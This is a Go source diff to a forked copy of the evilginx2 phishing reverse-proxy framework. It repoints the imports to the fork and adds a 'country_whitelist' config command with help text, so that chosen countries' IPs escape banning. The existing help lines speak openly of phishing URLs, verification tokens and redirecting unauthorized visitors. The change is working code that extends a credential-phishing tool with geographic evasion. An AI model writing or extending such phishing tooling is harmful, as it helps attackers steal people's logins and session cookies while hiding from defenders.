@@ -18,9 +18,9 @@ import (
 	"strings"
 	"time"
 
-	"github.com/kgretzky/evilginx2/database"
-	"github.com/kgretzky/evilginx2/log"
-	"github.com/kgretzky/evilginx2/parser"
+	"github.com/Brasco/evilginx2/database"
+	"github.com/Brasco/evilginx2/log"
+	"github.com/Brasco/evilginx2/parser"
 
 	"github.com/chzyer/readline"
 	"github.com/fatih/color"
@@ -191,7 +191,7 @@ func (t *Terminal) handleConfig(args []string) error {
 		vals := []string{t.cfg.baseDomain, t.cfg.serverIP, t.cfg.redirectParam, t.cfg.verificationParam, t.cfg.verificationToken, t.cfg.redirectUrl}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
-	} else if pn == 2 {
+	} else if pn > 1 {
 		switch args[0] {
 		case "domain":
 			t.cfg.SetBaseDomain(args[1])
@@ -220,6 +220,19 @@ func (t *Terminal) handleConfig(args []string) error {
 				}
 			}
 			t.cfg.SetRedirectUrl(args[1])
+			return nil
+		case "country_whitelist":
+			if len(args) == 3 {
+				switch args[1]{
+				case "add":
+					t.p.wl.AddCountry(args[2])
+					return nil
+				case "delete":
+					t.p.wl.DeleteCountry(args[2])
+					return nil
+				}
+			}
+			log.Warning("you need to specify an ISOCode")
 			return nil
 		}
 	}
@@ -971,6 +984,8 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"verification_key"}, "verification_key <name>", "change name of the verification parameter in phishing url (phishing urls will need to be regenerated)")
 	h.AddSubCommand("config", []string{"verification_token"}, "verification_token <token>", "change the value of the verification token (phishing urls will need to be regenerated)")
 	h.AddSubCommand("config", []string{"redirect_url"}, "redirect_url <url>", "change the url where all unauthorized requests will be redirected to (phishing urls will need to be regenerated)")
+	h.AddSubCommand("config", []string{"country_whitelist", "add"}, "country_whitelist add <ISOCode>", "add a new country ISO Code to the list of whitelisted country which IPs are not banned")
+	h.AddSubCommand("config", []string{"country_whitelist", "delete"}, "country_whitelist delete <ISOCode>", "delete a country ISO Code from the list of whitelisted country which IPs are not banned")
 
 	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
 		readline.PcItem("proxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password")))
